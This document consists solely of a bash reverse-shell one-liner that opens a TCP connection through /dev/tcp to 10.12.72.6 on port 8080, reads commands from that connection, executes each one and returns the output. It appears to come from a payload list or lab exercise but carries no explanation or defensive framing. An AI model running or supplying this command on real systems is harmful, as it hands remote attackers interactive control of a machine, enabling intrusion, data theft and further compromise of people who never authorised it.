exec 5<>/dev/tcp/10.12.72.6/8080; cat <&5 | while read line; do $line 2>&5 >&5; done
